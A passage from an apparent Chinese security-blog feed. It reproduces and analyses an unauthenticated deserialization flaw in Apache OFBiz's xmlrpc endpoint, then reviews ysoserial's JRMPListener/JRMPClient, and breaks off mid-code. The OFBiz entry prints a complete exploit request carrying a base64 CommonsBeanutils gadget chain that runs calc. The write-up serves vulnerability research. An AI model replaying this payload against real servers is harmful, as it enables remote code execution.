    <content type="html"><![CDATA[<h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>ofbiz&lt; 17.12.04</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载ofbiz、gradle后配置一下gradle的环境变量，随后直接运行gradle.bat进行build，最后<code>./gradlew ofbiz --debug-jvm</code><br>调试端口默认是5005<br>或者你直接idea打开后初始化一下gradle项目<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308123628-13ec0920-5903-4770-89a2-55f09dec8e7a.png#averageHue=%232d323a&clientId=uef16c7b1-bc90-4&from=paste&height=234&id=u93a97e7f&originHeight=292&originWidth=540&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24205&status=done&style=none&taskId=u235a14cd-b6c9-4e3c-81a3-b49db91d2aa&title=&width=432" alt="image.png"><br>你会看到有个build，编译好后会出现一个ofbiz.jar<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308147571-50d90ce2-0977-4c41-9dba-67c9927db4f7.png#averageHue=%233e3323&clientId=uef16c7b1-bc90-4&from=paste&height=261&id=u1e3639fb&originHeight=326&originWidth=721&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25424&status=done&style=none&taskId=u659c60fb-9977-42d1-9511-cdf774184d3&title=&width=576.8" alt="image.png"><br>然后我们运行这个jar包就可以开始debug了。<br>想调试的时候发现这个漏洞vulhub开放了5005端口但是没开启debug模式啊。。。希望vulhub之后可以加上debug功能。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/webtools/control/xmlrpc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8443</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=F637D1919F66DD42EED9EFF4B139CF3A.jvm1; Phpstorm-b3ad9363=84c4b31e-d5ed-4379-9a80-9b7507cedf1e; Pycharm-69800360=084fccb6-8efb-4ce0-ab83-e9ee9ec90c09; confluence.browse.space.cookie=space-blogposts; sidebar_collapsed=false; Goland-7a35ec7=48e3d45f-8c3b-456a-b871-9a45c9c01e45; cookie_token=ca76b89a250a514dd21370f8310865e199423e79b5b53392404ae1bb2ab24a8c; Phpstorm-b3ad9726=1202f496-542d-4162-91ec-bad957f445b9; lang=zh-cn; device=desktop; theme=default; OFBiz.Visitor=10000</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Microsoft Edge&quot;;v=&quot;122&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1697</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>ProjectDiscovery<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">member</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAVnK/rq+AAAAMQAZAQABYQcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlBwADDAAFAAYKAAgACQEAEWphdmEvbGFuZy9SdW50aW1lBwALAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADQAOCgAMAA8BAARjYWxjCAARAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEwAUCgAMABUBAApTb3VyY2VGaWxlAQAGYS5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAq4ABASErYAFlexAAAAAAABABcAAAACABhwdAAIYm9vZ2lwb3BwdwEAeHEAfgANeA==<span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>发送以下数据包到xmlrpc接口即可弹出计算器，base64是cb1链<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709307870220-38b831e2-1ca1-4ec9-9b5a-036acec14271.png#averageHue=%23a3814d&clientId=uef16c7b1-bc90-4&from=paste&height=858&id=u2bd6bf5b&originHeight=1072&originWidth=1584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=245179&status=done&style=none&taskId=u72edead3-d51f-4aef-98b1-0a20dc5cdd3&title=&width=1267.2" alt="image.png"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>流程是比较简单，源自一个接口未授权。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308694133-aed6ee6e-bf46-4382-93da-092c25ec62fb.png#averageHue=%232b2f36&clientId=uf202677c-b400-4&from=paste&height=334&id=u956cdf88&originHeight=417&originWidth=1773&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93223&status=done&style=none&taskId=u3d87d017-f5a2-43b1-a33f-e32f7c4ee3c&title=&width=1418.4" alt="image.png"><br>从漏洞的URL<code>/webapps/control/xmlrpc</code>可以找到web.xml文件，发现是由ControlServlet接管。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308755491-d429541e-c415-4d06-9585-08b97ab6dba8.png#averageHue=%2330343c&clientId=uf202677c-b400-4&from=paste&height=578&id=uc6dd9136&originHeight=722&originWidth=1796&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=211332&status=done&style=none&taskId=ub1422f52-9d6a-4e71-85b9-950ce8a4037&title=&width=1436.8" alt="image.png"><br>因此定位到doGet方法内部，可以看到首先需要获取RequestHandler<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308776189-8910aa9b-82a0-49e1-b805-6d9f5c3f6f8e.png#averageHue=%23323641&clientId=uf202677c-b400-4&from=paste&height=282&id=uf436b096&originHeight=353&originWidth=1422&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62936&status=done&style=none&taskId=u1900a440-d054-445d-8cb4-caf40445da6&title=&width=1137.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308791293-357b9541-5458-4a85-89a8-2d4f9214c613.png#averageHue=%23393c44&clientId=uf202677c-b400-4&from=paste&height=590&id=u2e9b0007&originHeight=737&originWidth=1367&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=114571&status=done&style=none&taskId=ud653c1c6-8add-4163-862e-9f92e866f63&title=&width=1093.6" alt="image.png"><br>读取了controller.xml，我们看看内容<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709307799494-1a7eccea-ed94-4246-9250-0d2cfdf3fcbf.png#averageHue=%23282d36&clientId=uef16c7b1-bc90-4&from=paste&height=202&id=u899950f5&originHeight=253&originWidth=977&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33882&status=done&style=none&taskId=u555f6da5-77eb-4a83-a851-3e118827517&title=&width=781.6" alt="image.png"><br>发现xmlrpc路由的security是false，也就是不需要鉴权的。因此我们得以后续利用。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308834071-b50f392e-1512-4595-af49-a97e0eaa0163.png#averageHue=%2330343d&clientId=uf202677c-b400-4&from=paste&height=543&id=ucbce7d1d&originHeight=679&originWidth=1805&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210875&status=done&style=none&taskId=u0ac549e8-e487-408f-bf17-6c06a999f2b&title=&width=1444" alt="image.png"><br>在doGet后面我们会进入doRequest方法内部<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308856860-5e613717-1e82-4b39-b8a6-4b52c2554af5.png#averageHue=%232b2f37&clientId=uf202677c-b400-4&from=paste&height=508&id=u19229bb4&originHeight=635&originWidth=1384&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=116039&status=done&style=none&taskId=u3bd19b2e-059e-48a2-9356-f3df5ea65c3&title=&width=1107.2" alt="image.png"><br>进而进入runEvent方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308871068-1561b3fa-ec03-43e0-be00-9233102e1e3f.png#averageHue=%23292e38&clientId=uf202677c-b400-4&from=paste&height=211&id=uc99e5a1e&originHeight=264&originWidth=1308&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32675&status=done&style=none&taskId=u0d338246-a386-4c9b-84b7-dd9e39248b8&title=&width=1046.4" alt="image.png"><br>进入XmlrpcRequestHandler的execute方法，首先获取了xmlrpc的config，然后读取了body流。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308902714-41e36825-22c2-4c31-8b7b-db1887192935.png#averageHue=%23323742&clientId=uf202677c-b400-4&from=paste&height=340&id=u72be03cd&originHeight=425&originWidth=1368&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=150573&status=done&style=none&taskId=u5bd43cfe-fcc7-4f71-bedf-e7c6a8eed13&title=&width=1094.4" alt="image.png"><br>最后交给SAXParsers去处理。<br>在扫描xml的标签的时候会进入getparser方法获取对应tags的parser<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308945713-3a53f9da-eb56-4cdf-a20c-7f8488511de3.png#averageHue=%2330343e&clientId=uf202677c-b400-4&from=paste&height=424&id=ud8dc715b&originHeight=530&originWidth=1358&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108111&status=done&style=none&taskId=u30e0798f-2cdb-4761-9bfb-080f0bfdf9b&title=&width=1086.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308951391-d5e999eb-7f45-4889-aaef-0c6cf62a6b93.png#averageHue=%23282c34&clientId=uf202677c-b400-4&from=paste&height=116&id=uae1ae9d7&originHeight=145&originWidth=919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15834&status=done&style=none&taskId=uc20f5be7-4d65-47be-ad15-71ac3d6267f&title=&width=735.2" alt="image.png"><br>如果是serializable标签那么就返回SerializableParser<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709308983458-372fe2af-d84e-474e-adb1-087e5c4353d2.png#averageHue=%23282d35&clientId=uf202677c-b400-4&from=paste&height=278&id=u6d113edf&originHeight=347&originWidth=1313&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68185&status=done&style=none&taskId=ua27cbe29-3c3d-48e2-8471-c1a8994d41e&title=&width=1050.4" alt="image.png"><br>它的父类是ByteArrayParser，在最后会调用startElement方法<img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709309002610-668675d3-77cd-4c43-9457-23a6c3d54fab.png#averageHue=%23282c35&clientId=uf202677c-b400-4&from=paste&height=188&id=u92211069&originHeight=235&originWidth=1287&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30284&status=done&style=none&taskId=u323f410f-b151-413e-ab98-d1e535bc4a9&title=&width=1029.6" alt="image.png"><br>这里解密了我们的base64数据。最后在SerializerParser的getResult方法进行反序列化。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709309099570-1b8df000-8546-4abf-93c0-8650b589f260.png#averageHue=%2331353f&clientId=uf202677c-b400-4&from=paste&height=387&id=uaf10db47&originHeight=484&originWidth=1489&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75513&status=done&style=none&taskId=u6edf3c9e-1e26-4edb-8f42-9c594e61738&title=&width=1191.2" alt="image.png"><br>ofbiz内置cb依赖，因此可以打cb链。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709309115956-190596b9-a746-4c84-b10e-a5461b1ef830.png#averageHue=%23668e6f&clientId=uf202677c-b400-4&from=paste&height=523&id=u89ab0f72&originHeight=654&originWidth=1473&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108605&status=done&style=none&taskId=u699c8bdf-cf32-45bd-8a7e-7e1551319f3&title=&width=1178.4" alt="image.png"></p>]]></content>
    
    
    <summary type="html">妈的</summary>
    
    
    
    <category term="At Dawn" scheme="http://boogipop.com/categories/At-Dawn/"/>
    
    
    <category term="Java" scheme="http://boogipop.com/tags/Java/"/>
    
    <category term="CVE" scheme="http://boogipop.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Ysoserial JRMPListener/Client Review</title>
    <link href="http://boogipop.com/2024/02/29/Ysoserial%20JRMPListener_Client%20Review/"/>
    <id>http://boogipop.com/2024/02/29/Ysoserial%20JRMPListener_Client%20Review/</id>
    <published>2024-02-29T00:42:44.000Z</published>
    <updated>2024-02-29T00:42:44.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://github.com/frohoff/ysoserial/raw/master/ysoserial.png#from=url&id=wHNpd&originHeight=251&originWidth=300&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title="></p><p><strong>文章在先知社区首发</strong></p><p>之前对这玩意儿还是不太熟悉呢，RMI的流程是熟悉了，但是这个还是有点混淆，特此记录。<br>有关RMI的直接推荐看一下Su18师傅的<br><a href="https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93">https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93</a><br>这个写的不错我觉得。思路和条理都比较清晰，但是光看还是不行的。比我写的好，理清一下思路。（我自己都不想看自己写的)<br>也就是说当RMI Client发起请求后，流程大概如下</p><blockquote><ol><li>RMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。</li><li>Stub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。</li><li>RemoteCall 序列化 RMI 服务名称、Remote 对象。</li><li>RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</li><li>RMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。</li><li>Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</li><li>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</li><li>RMI 客户端反序列化服务端结果，获取远程对象的引用。</li><li>RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li><li>RMI 客户端反序列化 RMI 远程方法调用结果。</li></ol></blockquote><p>上述是su18写的原话，我感觉是精华。结构感很强，我看的很懂，因为之前也自己分析过一遍流程，所以看的比较明白。</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="JRMPListenr"><a href="#JRMPListenr" class="headerlink" title="JRMPListenr"></a>JRMPListenr</h2><p>顾名思义就是起一个恶意的JRMP 监听器，用于接收一个JRMP请求，然后将恶意的序列化数据返回给我们的客户端，在客户端完成反序列化流程，最终RCE。这里演示一遍简单的流程，首先需要准备一下yso源码，然后写一个简单的demo请求这个Evil Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:7777/xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>yso这边设置启动项<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703162945575-42e35009-5025-417e-a34b-7ad7e3be2538.png#averageHue=%232c2f33&clientId=ud9a21f8b-e36e-4&from=paste&height=689&id=u8afccc8e&originHeight=861&originWidth=1306&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108115&status=done&style=none&taskId=ufdc6401b-e58f-4eab-a798-fbc894a2eda&title=&width=1044.8" alt="image.png"><br>运行之后就会发现弹出了客户端弹出了计算器。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703162972327-654b193a-b4a0-44d6-970a-d7aae908d01a.png#averageHue=%2324464c&clientId=ud9a21f8b-e36e-4&from=paste&height=630&id=uefe59062&originHeight=788&originWidth=1274&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45090&status=done&style=none&taskId=u1b4cb1d7-d9ba-4d0a-b0f7-08371d2a06b&title=&width=1019.2" alt="image.png"></p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>这边进行双向流程分析，受害机和服务端的流程分析。<br>首先当客户端进行lookup后，服务端的thread会接收请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163155065-452882ad-9dc0-40d2-bd1d-d7905af83c07.png#averageHue=%232d313a&clientId=ud9a21f8b-e36e-4&from=paste&height=687&id=u70d8370c&originHeight=859&originWidth=1804&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210670&status=done&style=none&taskId=uc11bdfaa-86e9-4b4e-83a5-685f7ee1da2&title=&width=1443.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163166235-e434aa37-9554-4b64-b9d4-61da4e9ce157.png#averageHue=%23484b5d&clientId=ud9a21f8b-e36e-4&from=paste&height=96&id=ufbcaf8b6&originHeight=120&originWidth=1407&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26837&status=done&style=none&taskId=u0ace0728-c32f-4422-ab95-eadd5c456eb&title=&width=1125.6" alt="image.png"><br>进入到doMessage流程，然后会在client这边获取到op<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163200117-68d29851-ca02-4f9d-bf8d-d7e84aba1d5d.png#averageHue=%23282d36&clientId=ud9a21f8b-e36e-4&from=paste&height=210&id=uea090f7e&originHeight=263&originWidth=1136&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45019&status=done&style=none&taskId=uebe32408-5d8d-46b7-b5ae-2693aa65384&title=&width=908.8" alt="image.png"><br>获取之后返回给服务端<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163209607-650a761c-3c6c-4209-8ee2-81399a093004.png#averageHue=%2331343e&clientId=ud9a21f8b-e36e-4&from=paste&height=367&id=u09b8126c&originHeight=459&originWidth=1864&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105553&status=done&style=none&taskId=ue3dc2ca8-cc1a-43bf-9e47-ea4211a730d&title=&width=1491.2" alt="image.png"><br>这里op是80，对应<code>TransportConstants.Call</code>进入docall方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163244529-2331d6a0-d8fd-4f1b-baad-5bdc56461821.png#averageHue=%232d3139&clientId=ud9a21f8b-e36e-4&from=paste&height=686&id=u891f8d5e&originHeight=858&originWidth=1767&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197848&status=done&style=none&taskId=ufb3d1f27-6869-4eb0-b7e0-4156107ebbb&title=&width=1413.6" alt="image.png"><br>在这里开始设置恶意的返回值。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163263197-4636ec88-2a8e-457c-9d1b-cd93aef71abb.png#averageHue=%23363a47&clientId=ud9a21f8b-e36e-4&from=paste&height=214&id=ufeb81a0a&originHeight=267&originWidth=1540&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=73677&status=done&style=none&taskId=u6db9358b-0025-4c69-b3aa-39d474fb196&title=&width=1232" alt="image.png"><br>注意这里设置了<code>TransportConstants.ExceptionalReturn</code>，这与我们后续client处理请求有关系，然后设置了一下payloadObject，这里是CC5。<br>随之进入Client<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163329719-0c5339da-a668-48ac-82c7-2d1a5332fc60.png#averageHue=%232d3139&clientId=ud9a21f8b-e36e-4&from=paste&height=647&id=u0a6340ad&originHeight=809&originWidth=1488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108929&status=done&style=none&taskId=u68c59a20-f4e5-40f7-8e55-0f53fcaf25e&title=&width=1190.4" alt="image.png"><br>这里的return type就是上面服务端设置的<code>TransportConstants.ExceptionalReturn</code>,因此我们会进入相应的case<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163355228-d7033c85-1f9f-4b63-9bba-d45fd2247b2d.png#averageHue=%232e3139&clientId=ud9a21f8b-e36e-4&from=paste&height=568&id=u6ab43221&originHeight=710&originWidth=1531&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93823&status=done&style=none&taskId=uf528c45c-57c7-4f90-801c-c0db612edce&title=&width=1224.8" alt="image.png"><br>这里就对输入流进行了原生的反序列化。到这里也就完成了RCE，还是很有趣的。</p><h2 id="JRMPClient"><a href="#JRMPClient" class="headerlink" title="JRMPClient"></a>JRMPClient</h2><p>参考下列的Payloads&#x2F;JRMPListener部分，他是用来主动攻击我们开启的JRMP服务端的。<br>Yso中对应的源码是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makeDGCCall</span> <span class="params">( String hostname, <span class="type">int</span> port, Object payloadObject )</span> <span class="keyword">throws</span> IOException, UnknownHostException, SocketException &#123;</span><br><span class="line">       <span class="type">InetSocketAddress</span> <span class="variable">isa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(hostname, port);</span><br><span class="line">       <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           s = SocketFactory.getDefault().createSocket(hostname, port);</span><br><span class="line">           s.setKeepAlive(<span class="literal">true</span>);</span><br><span class="line">           s.setTcpNoDelay(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">           <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">           dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line"></span><br><span class="line">           dos.writeInt(TransportConstants.Magic);</span><br><span class="line">           dos.writeShort(TransportConstants.Version);</span><br><span class="line">           dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line"></span><br><span class="line">           dos.write(TransportConstants.Call);</span><br><span 